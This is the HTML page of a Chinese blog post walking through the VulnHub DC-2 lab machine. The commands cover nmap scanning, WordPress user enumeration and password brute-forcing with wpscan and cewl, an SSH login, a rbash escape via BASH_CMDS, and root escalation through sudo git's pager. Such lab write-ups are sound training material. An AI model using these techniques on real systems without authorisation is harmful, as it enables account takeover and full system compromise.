@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title> DC-2靶机完全渗透 | zJ4sun</title>
+<meta name="description" content="行胜于言">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://zj4sun.github.io//favicon.ico?v=1735599266098">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://zj4sun.github.io//styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://zj4sun.github.io/">zJ4sun</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1> DC-2靶机完全渗透</h1>
+            <p class="article-meta">
+              2024-04-28
+              
+                <a href="https://zj4sun.github.io/tag/ZtS9EorEb/" class="badge secondary">
+                  web安全之路
+                </a>
+              
+                <a href="https://zj4sun.github.io/tag/1Wpns8h4a/" class="badge secondary">
+                  vulnhub打靶
+                </a>
+              
+            </p>
+            
+            <div class="post-content" v-pre>
+              <h2 id="前言">前言：</h2>
+<p>项目地址：https://www.vulnhub.com/entry/dc-2,311/</p>
+<h2 id="流程">流程：</h2>
+<figure data-type="image" tabindex="1"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031832862.png" alt="image-20240403183207826" loading="lazy"></figure>
+<p>同样的没有什么可用信息。</p>
+<p>先用namp扫扫存活主机</p>
+<pre><code>namp -sP 192.168.80.0/24
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031828397.png" alt="image-20240403182830311" loading="lazy"></figure>
+<p>这里判断192.168.80.129为我们的目标ip。</p>
+<p>使用nmap看看端口</p>
+<figure data-type="image" tabindex="3"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031848351.png" alt="image-20240403184823314" loading="lazy"></figure>
+<p>后面尝试了一会发现这个不行，开始怀疑网络有问题，去看看了网上的教程发现是能够搜索到的端口的，又回去看描述，发现默认是用桥接的模式，加上我用的kali虚拟机来攻击那样本来就不在一个内网环境了，而且我vm还没有桥接网卡（😀）一番修改重启后再次尝试</p>
+<figure data-type="image" tabindex="4"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031847779.png" alt="" loading="lazy"></figure>
+<p>这里发现新的ip192.168.80.130，那应该就是他了，扫描后发现了80端口。</p>
+<figure data-type="image" tabindex="5"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031859592.png" alt="" loading="lazy"></figure>
+<p>再嗦一下</p>
+<pre><code> nmap -A -p- -T4 192.168.80.130
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031902909.png" alt="image-20240403190201784" loading="lazy"></figure>
+<p>发现了80端口和ssh服务。应该是这两个突破口。主机尝试访问不能访问。</p>
+<figure data-type="image" tabindex="7"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031903695.png" alt="image-20240403190326628" loading="lazy"></figure>
+<p>这里我就没有思路了，没有看到特别明显的地方，我就去网上看别的师傅的文章了。这里需要解析页面看看报错原因</p>
+<figure data-type="image" tabindex="8"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031908147.png" alt="image-20240403190840068" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031908578.png" alt="image-20240403190820544" loading="lazy"></figure>
+<p>那么就可以得到域名没有解析成功，这里就要返回去kali的host下加一个记录<code>sudo vim /etc/hosts</code></p>
+<p><code>192.168.80.130 dc-2</code>这里又糊涂了，我是用主机访问的，但是在用kali更改（🧠不好）</p>
+<figure data-type="image" tabindex="10"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031915431.png" alt="image-20240403191501772" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031915231.png" alt="image-20240403191522044" loading="lazy"></figure>
+<p>发现flag1.</p>
+<h2 id="flag1">flag1</h2>
+<pre><code>Flag 1:
+Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
+More passwords is always better, but sometimes you just can’t win them all.
+Log in as one to see the next flag.
+If you can’t find it, log in as another.
+你常用的词汇表可能行不通，所以，也许你只需要保持冷静即可。
+密码越多越好，但有时您无法赢得所有密码。
+以一个身份登录即可查看下一个标志。
+如果找不到，请以其他身份登录。
+</code></pre>
+<p>这里提到了身份登录这个提示词，我想到了两个思路，一个是这个是那个wordpress搭建的系统尝试寻求漏洞登录，或者去看看ssh那边。先试试框架漏洞吧，去msf中有没有什么相关的。<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031921979.png" alt="image-20240403192107757" loading="lazy"></p>
+<p>发现全是 洞。用一个比较新的excellent试试，发现不行，ssh那边一想没有什么可以可以利用的，又去看别的师傅的路子。发现他们用了两个新工具wpscan和cewl。之前都没听过，记下来了。这里的思路就是用那些工具爆破账号密码。</p>
+<p>那我们就先看看网站有哪些用户：</p>
+<pre><code>wpscan --url http://dc-2 -e u
+#扫描wordpress中的发表过文章的用户
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031934457.png" alt="image-20240403193445359" loading="lazy"></figure>
+<p>枚举用户名 扫描发现三个用户，分别为：admin, jerry, tom</p>
+<p>利用刚刚扫描得到的用户信息，通过 cewl 生成密码字典：</p>
+<pre><code>cewl http://dc-2 -w pass
+</code></pre>
+<p>针对 dc-2 这个网站生成字典，并保存在pass文件中</p>
+<p>再创建一个 name 文件，保存刚刚扫出来的三个用户名</p>
+<pre><code>vim name.txt
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031939956.png" alt="image-20240403193948734" loading="lazy"></figure>
+<p>对dc-2进行爆破，使用的字典为刚刚写的 name 和 pass</p>
+<p>wpscan 爆破用户密码：</p>
+<pre><code>wpscan --url http://dc-2 -U name.txt -P pass
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031943815.png" alt="image-20240403194338748" loading="lazy"></figure>
+<p>成功爆出了jerry和tom的密码。wordpress有一个默认后台，</p>
+<p>然后我们打开wp的管理后台，一般都是wp-admin</p>
+<pre><code class="language-javascript">http://dc‐2/wp‐admin
+</code></pre>
+<p>复制先登录jerry的账号，发现flag2</p>
+<figure data-type="image" tabindex="15"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031946006.png" alt="image-20240403194624897" loading="lazy"></figure>
+<h2 id="flag-2">Flag 2:</h2>
+<pre><code>If you can't exploit WordPress and take a shortcut, there is another way.
+Hope you found another entry point.
+如果你无法利用 WordPress 并走捷径，还有另一种方法。
+希望您找到另一个切入点
+</code></pre>
+<p>意思就是直接爆破Wordpress是没用的，前期msf尝试的结果一样一样的，这里就要考虑ssh，这利还获得了两个账号密码。先试试能否远程。加-p是因为非常规端口，需要指定。</p>
+<pre><code>ssh tom@192.168.80.130 -p 7744
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031952159.png" alt="image-20240403195209066" loading="lazy"></figure>
+<p>这里看到flag3，第一时间想看看，发现了rbash。</p>
+<figure data-type="image" tabindex="17"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404031953297.png" alt="image-20240403195327243" loading="lazy"></figure>
+<p>谷歌一番。是环境变量异常。这里是盲区，网上的师傅这样设置的</p>
+<pre><code>tom@DC‐2:~$ BASH_CMDS[a]=/bin/sh;a
+$ /bin/bash
+tom@DC‐2:~$ export PATH=$PATH:/bin/
+tom@DC‐2:~$ export PATH=$PATH:/usr/bin
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032008352.png" alt="image-20240403200841279" loading="lazy"></figure>
+<h2 id="flag3">flag3</h2>
+<pre><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+可怜的老汤姆总是追赶杰瑞。 也许他应该忍受他造成的所有压力。
+</code></pre>
+<p>这里应该是提示需要换到jerry的账号<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032012017.png" alt="image-20240403201218958" loading="lazy"></p>
+<p>这里开始以为自己输错了，输了两次好像这个密码不对。后面一看原来可以直接切换用户<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032013249.png" alt="image-20240403201345212" loading="lazy"></p>
+<figure data-type="image" tabindex="19"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032015356.png" alt="image-20240403201524324" loading="lazy"></figure>
+<p>这里发现了flag4.txt</p>
+<h2 id="flag4">flag4</h2>
+<pre><code>Good to see that you've made it this far - but you're not home yet. 
+
+You still need to get the final flag (the only flag that really counts!!!).  
+
+No hints here - you're on your own now.  :-)
+
+Go on - git outta here!!!!
+很高兴看到你已经做到了这一步 - 但你还没到家。
+您仍然需要获得最终标志（唯一真正重要的标志！！！）。
+这里没有任何提示——你现在只能靠自己了。 :-)
+继续 - 离开这里！！！！
+</code></pre>
+<p>居然啥都没有了，接下来是自己去找，我想用find去找看看。发现一无所获，说明在这个目录下已经没有什么利用价值了，接下来就是转战root</p>
+<p>那么我们看看jerry有没有可以执行的具有root权限的命令</p>
+<pre><code class="language-javascript">sudo ‐l
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032034336.png" alt="image-20240403203456298" loading="lazy"></figure>
+<p>这里有一个很明显的git命令，还是不需要密码的，去网上找下利用git命令提权的文章</p>
+<pre><code>sudo git help config
+# root权限打开git的配置，注意这里一定要sudo，不然是以普通用户身份打开git
+</code></pre>
+<figure data-type="image" tabindex="21"><a href="https://s3.xiabee.cn/pic/2023/03/1cfc52ed386a17e7a59c48df793e3b6e9b17f878d15b8daab9c979bb8e9d1f7b.png"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032044456.png" alt="image-20230321160051663" loading="lazy"></a></figure>
+<p>多页分隔，绝佳的 hack 位点</p>
+<pre><code>l's!/bin/bash
+# 直接在config里面输入命令，反弹bash
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032043342.png" alt="image-20240403204356245" loading="lazy"></figure>
+<h2 id="finnal-flag">finnal-flag</h2>
+<figure data-type="image" tabindex="23"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032045708.png" alt="image-20240403204523649" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>这次渗透过程中有很多地方出现了卡壳没有思路了，期间看了几次几位师傅的文章来开拓思路了。特别有位师傅的思路，登录到一个账号之后先看可以执行的命令，这在以前来说都是没有注意到的地方。也可以用<code>compgen ‐c</code></p>
+<p>我们先看看tom可以执行那些命令</p>
+<pre><code class="language-javascript">tom@DC‐2:~$ echo $PATH
+tom@DC‐2:~$ echo /home/tom/usr/bin/*
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202404032047870.png" alt="img" loading="lazy"></figure>
+<p>里面还提到了<strong>rbash绕过方式</strong>，以及最后的提权都是学习的</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://zj4sun.github.io/post/dc-1-ba-ji-wan-quan-shen-tou/">
+                <h3 class="post-title">
+                  DC-1靶机完全渗透
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://zj4sun.github.io//images/avatar.png?v=1735599266098" class="no-responsive avatar">
+    <div class="text-muted">行胜于言</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-nian-zhong-zong-jie/">2024年年度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/wei-xie-qing-bao/">威胁情报</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-si-ji-du-zong-jie/">2024年第四季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/ruo-kou-ling-zong-jie/">弱口令总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-san-ji-du-zong-jie/">2024年第三季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/python-pa-chong-xue-xi-bi-ji/">python爬虫学习笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/githubgridea-pei-zhi-ge-ren-bo-ke-wu-fa-jia-zai-maincss-wen-ti/">github+gridea配置个人博客无法加载main.css问题</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-er-ji-du-zong-jie/">2024年第二季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/xuan-ji-ba-chang-apcahe-ri-zhi-fen-xi/">玄机靶场-apcahe日志分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/xuan-ji-ba-chang-linux-ri-zhi-fen-xi/">玄机靶场-Linux日志分析</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://zj4sun.github.io/tag/EjyP2cHMk/" class="badge ">
+          live生活
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/Mt6wUAkn1/" class="badge warning">
+          quarter总结
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/zrEiWq5mHs/" class="badge success">
+          information研究
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/qXZ0OLIUJ/" class="badge secondary">
+          python脚册
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/EJT8wG8lz/" class="badge ">
+          setting环境设置
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/ApJiA0cW4/" class="badge ">
+          Emergency响应
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/ZtS9EorEb/" class="badge warning">
+          web安全之路
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/4KkPHXGCg/" class="badge warning">
+          job实习项目
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/1Wpns8h4a/" class="badge success">
+          vulnhub打靶
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://zj4sun.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
